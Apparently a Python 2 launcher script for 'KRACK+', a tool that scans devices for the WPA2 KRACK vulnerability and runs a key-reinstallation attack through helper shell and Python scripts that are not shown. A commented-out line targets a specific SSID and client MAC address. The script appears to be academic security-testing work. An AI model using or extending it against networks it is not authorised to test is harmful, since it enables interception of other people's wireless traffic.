#!/usr/bin/env python
import sys
import optparse
import subprocess
import atexit
import logging
import thread
from parser import *
from multiprocessing import Process
LOG_LEVEL = logging.DEBUG
LOGFORMAT = "%(log_color)s%(message)s%(reset)s"
from colorlog import ColoredFormatter
from subprocess import check_output
logging.root.setLevel(LOG_LEVEL)
formatter = ColoredFormatter(LOGFORMAT)
stream = logging.StreamHandler()
stream.setLevel(LOG_LEVEL)
stream.setFormatter(formatter)
log = logging.getLogger('pythonConfig')
log.setLevel(LOG_LEVEL)
log.addHandler(stream)

########   Examples which gives dirrent colored output    #################
#log.debug("A quirky message only developers care about")             WHITE
#log.info("Curious users might want to know this")                    GREEN
#log.warn("Something is wrong and any user should be informed")       YELLOW
#log.error("Serious stuff, this is red for a reason")                 RED
#log.critical("OH NO everything is on fire")                          SUPER RED/ORANGE

log.debug("KRACK+ is a tool to scan for and exploit the KRACK vulnerability in WPA2, discovered by Mathy Vanhoef.")
log.debug("KRACK+ 1.0 by Lars Magnus Trinborgholen, Fredrik Walloe and Lars Kristian Maehlum.\n")

def main():
    parser = optparse.OptionParser()

   #Option to run KRACK vulnerability scan. 
    parser.add_option('--scan','-s', help="This option will create a network with SSID 'testnetwork' where the default password is 'abcdefgh'."
                     " Simply connect to the network and the scan will be executed against the connected device.", dest='scan', default=False, action='store_true')

    #Option to add nmap OS/Device detection against clients being scanned.
    parser.add_option('--os-detection', '-o', help="This option will add nmap OS/Device detection against clients being scanned", dest='os', default=False, action='store_true')

    #Option to set the SSID for the created test network.
    parser.add_option('--set-ssid', default='testnetwork', help="Use this option to set the SSID for the created network.", dest='ssid')

    #Option kto set password for the created test network.
    parser.add_option('--set-password', default='abcdefgh', help="Use this option to set the password for the created network."
                      " Password length has to be 8 characters or more!", dest='password')
    
    #Adding option to run attack against .....   
    parser.add_option('--attack', '-a', default=False, help="This option will run a key reinstallation attack against ....", dest='attack', action='store_true')

    options, args = parser.parse_args()
    path = "~/krack/"
    # Running scan scripts
    # TODO we have two ifs here. Inner one should not be necessary. 
    if options.scan:
        #Write the credentials to file, so that they can be used next time the progran runs.
        with open('networkCredentials.txt', 'w') as netCredentials:
            netCredentials.write(options.ssid + '\n' + options.password)
        try:
            #Runs if user has specified custom wlan credentials
	    if options.ssid is not 'testnetwork' and options.password is not 'abcdefgh':
                subprocess.check_call(['./prepareClientScan.sh', 'customCredentials'])
            else:
                subprocess.call(["./prepareClientScan.sh"])
            log.info("Running KRACK+ Scan:")
            log.warn("Connect to '" + options.ssid + "' with '" + options.password + "' to scan devices.")
            log.warn("Press 'ctrl-c' to end scan and generate PDF of findings. Scan will end 1.5 minutes after last connected device.")
      	    with open('scanOutput.txt', 'w') as scanOutput:
                subprocess.call(["./findVulnerable/krackattack/krack-test-client.py &"], stdout=scanOutput, shell=True)
                #subprocess.call(["./outputHandler.sh scanOutput.txt nmap"], shell=True) if options.os else subprocess.call(["./outputHandler.sh scanOutput.txt"], shell=True)
                #subprocess.call(["python parser.py"], shell=True)
            # options.os is a bool
            scanParser(options.os)      
        except KeyboardInterrupt:
            log.info("Generating PDF with findings and cleaning up...")
            subprocess.call(["./restoreClientWifi.sh"])
            subprocess.call(["rm scanOutput.txt"], shell=True)
            log.info("PDF generated in '" + path + "'.")
        except:
            log.info("Error occurred. Restoring wifi ...")
            subprocess.call(["./restoreClientWifi.sh"])
    # Running attack scripts
    elif options.attack:
        try:
            print("Performing key reinstallation attack")
            #Sets up dependencies before the attack script runs
            subprocess.call(["./prepareClientAttack.sh"])
        #TODO subprocess, run attack script; note that this static implementation is only for testing purposes and should be removed. 	
        #subprocess.call(["./krackattacks-poc-zerokey/krackattack/krack-all-zero-tk.py wlan1 wlan0 Brennbakkvegen194 --target 54:27:58:63:14:aa"])
        except KeyboardInterrupt:
            log.info("Cleaning up and restoring wifi ...")
            subprocess.call(["./restoreClientWifi.sh"])
	except:
            log.info("Error occurred. Restoring wifi ...")
            subprocess.call(["./restoreClientWifi.sh"])
            
    # Must specify an option    
    else:
        log.warn("No option was given, please see usage below and try again!")
        parser.print_help()

if __name__ == '__main__':
	#TODO should these be removed?
    #main = Process(target=main)
    #main.start() 
    #main.join()
    #pairedMacIP = getDevices()
    #nmap = Process(target=nmap)
    #nmap.start(pairedMacIP)
    #nmap.join()
    main()
